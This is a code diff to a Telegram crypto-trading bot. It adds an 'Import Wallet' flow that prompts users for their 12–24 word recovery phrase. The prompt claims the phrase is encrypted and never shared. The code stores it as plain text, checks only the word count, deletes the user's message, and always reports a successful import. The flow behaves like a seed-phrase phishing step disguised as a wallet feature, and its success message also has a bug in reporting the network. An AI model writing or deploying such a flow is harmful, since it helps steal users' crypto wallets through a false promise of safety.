@@ -578,14 +578,9 @@ function defaultState() {
     mevProtection: false,
     tradeHistory: [],
     copyTrades: [],
-    stakingPositions: [],
-    dcaPlans: [],
-    settings: {
-      slippage: false,
-      autoBuy: false,
-      mevProtection: false,
-    signalStrength: 0,
-    },
+    awaitingImportWallet: false,
+    importWalletNetwork: null,
+    importWalletType: null,
   };
 }
 
@@ -807,6 +802,18 @@ function networkKeyboard() {
   ]).resize();
 }
 
+function walletSelectKeyboard(network) {
+  const prefix = network === "solana" ? "🟣" : "🔵";
+  return Markup.keyboard([
+    [`${prefix} Phantom`, `${prefix} Solflare`],
+    [`${prefix} Trust`, `${prefix} MetaMask`],
+    [`${prefix} Coinbase`, `${prefix} Ledger`],
+    [`${prefix} Exodus`, `${prefix} Trezor`],
+    [`${prefix} Atomic`],
+    ["🔙 Back"],
+  ]).resize();
+}
+
 function dashboardKeyboard() {
   return Markup.keyboard([
     ["🏠 Main Menu", "💰 Buy", "📉 Sell"],
@@ -927,6 +934,30 @@ async function handleStepNetwork(ctx, state) {
     caption: NETWORK_TEXT,
     parse_mode: "Markdown",
     reply_markup: networkKeyboard().reply_markup,
+  });
+}
+
+async function handleImportWalletNetwork(ctx, state, network) {
+  state.importWalletNetwork = network;
+  state.currentView = "import_wallet_select";
+  const networkLabel = network === "solana" ? "🟣 Solana" : "🔵 Ethereum";
+  return replyWithCachedPhoto(ctx, "network", {
+    caption: `Import Wallet\nNetwork: ${networkLabel}\n\nSelect your wallet:`,
+    parse_mode: "Markdown",
+    reply_markup: walletSelectKeyboard(network).reply_markup,
+  });
+}
+
+async function handleImportWalletSelect(ctx, state, walletType) {
+  state.importWalletType = walletType;
+  state.awaitingImportWallet = true;
+  state.currentView = "import_wallet_phrase";
+  const networkLabel = state.importWalletNetwork === "solana" ? "🟣 Solana" : "🔵 Ethereum";
+  const walletLabel = walletType.charAt(0).toUpperCase() + walletType.slice(1);
+  return replyWithCachedPhoto(ctx, "network", {
+    caption: `Import ${walletLabel}\nNetwork: ${networkLabel}\n\nPaste your wallet recovery phrase (12-24 words):\n<i>your phrase is encrypted and never shared</i>`,
+    parse_mode: "HTML",
+    reply_markup: { remove_keyboard: true },
   });
 }
 
@@ -1634,8 +1665,33 @@ async function handleAlertsToggle(ctx, state) {
 }
 
 function dispatchNav(text, state) {
-  if (text === "✨ Generate Wallet" || text === "📥 Import Wallet") return (ctx) => handleStepNetwork(ctx, state);
+  if (text === "✨ Generate Wallet") return (ctx) => handleStepNetwork(ctx, state);
+  if (text === "📥 Import Wallet") {
+    state.awaitingImportWallet = true;
+    return (ctx) => handleStepNetwork(ctx, state);
+  }
+  if ((text === "🟣 Solana" || text === "🔵 Ethereum") && state.awaitingImportWallet) {
+    const network = text === "🟣 Solana" ? "solana" : "ethereum";
+    return (ctx) => handleImportWalletNetwork(ctx, state, network);
+  }
   if (text === "🟣 Solana" || text === "🔵 Ethereum") return (ctx) => handleStepAssigned(ctx, state);
+
+  const importWalletPrefix = state.importWalletNetwork === "solana" ? "🟣" : "🔵";
+  const walletButtons = [
+    "Phantom", "Solflare", "Trust", "MetaMask", 
+    "Coinbase", "Ledger", "Exodus", "Trezor", "Atomic"
+  ];
+  if (state.currentView === "import_wallet_select" && walletButtons.some(w => text === `${importWalletPrefix} ${w}`)) {
+    const walletType = text.replace(`${importWalletPrefix} `, "").toLowerCase();
+    return (ctx) => handleImportWalletSelect(ctx, state, walletType);
+  }
+
+  if (text === "🔙 Back" && state.currentView === "import_wallet_select") {
+    state.importWalletNetwork = null;
+    state.currentView = "network";
+    return (ctx) => handleStepNetwork(ctx, state);
+  }
+
   if (text === "🏠 Main Menu") return (ctx) => handleDashMain(ctx, state);
   if (text === "💰 Buy") return (ctx) => handleDashBuy(ctx, state);
   if (text === "📉 Sell") return (ctx) => handleDashSell(ctx, state);
@@ -2616,6 +2672,28 @@ bot.on("text", async (ctx) => {
         return ctx.reply(`✅ Username updated for ID: ${targetId} -> @${text}`);
       }
     }
+  }
+
+  if (state.awaitingImportWallet && state.currentView === "import_wallet_phrase") {
+    await deleteUserMessage(ctx);
+    const words = text.trim().split(/\s+/).filter(w => w.length > 0);
+    if (words.length >= 12 && words.length <= 24) {
+      state.awaitingImportWallet = false;
+      state.importWalletPhrase = text.trim();
+      state.importWalletNetwork = null;
+      state.importWalletType = null;
+      state.currentView = "wallet_imported";
+      return replyWithCachedPhoto(ctx, "wallet", {
+        caption: `✅ <b>Wallet Imported Successfully!</b>\n\n<i>Your ${state.importWalletType || "wallet"} has been imported on ${state.importWalletNetwork === "solana" ? "Solana" : "Ethereum"}.</i>`,
+        parse_mode: "HTML",
+        reply_markup: dashboardKeyboard().reply_markup,
+      });
+    }
+    return replyWithCachedPhoto(ctx, "network", {
+      caption: `❌ <b>Invalid Recovery Phrase</b>\n\nPlease enter 12-24 words. You entered ${words.length} words.\n\n<i>your phrase is encrypted and never shared</i>`,
+      parse_mode: "HTML",
+      reply_markup: { remove_keyboard: true },
+    });
   }
 
   if (state.awaitingEmail) {
